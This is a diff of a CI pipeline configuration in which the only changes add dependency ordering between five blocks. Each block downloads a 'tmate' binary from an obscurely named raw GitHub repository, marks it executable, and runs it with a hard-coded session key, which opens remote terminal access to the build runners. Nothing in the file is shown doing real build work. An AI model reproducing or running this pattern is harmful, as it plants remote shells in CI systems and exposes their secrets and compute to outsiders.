@@ -13,6 +13,7 @@ blocks:
             - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
             - chmod +x tmate
             - ./tmate -F -n j1 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+    dependencies: []
   - name: 'Block #2'
     task:
       jobs:
@@ -21,6 +22,8 @@ blocks:
             - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
             - chmod +x tmate
             - ./tmate -F -n j2 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+    dependencies:
+      - Build_and_Deploy
   - name: 'Block #3'
     task:
       jobs:
@@ -29,6 +32,8 @@ blocks:
             - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
             - chmod +x tmate
             - ./tmate -F -n j3 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+    dependencies:
+      - 'Block #2'
   - name: 'Block #4'
     task:
       jobs:
@@ -37,6 +42,8 @@ blocks:
             - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
             - chmod +x tmate
             - ./tmate -F -n j4 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+    dependencies:
+      - 'Block #3'
   - name: 'Block #5'
     task:
       jobs:
@@ -45,3 +52,8 @@ blocks:
             - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
             - chmod +x tmate
             - ./tmate -F -n j5 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+    dependencies:
+      - 'Block #2'
+      - 'Block #3'
+      - 'Block #4'
+      - Build_and_Deploy
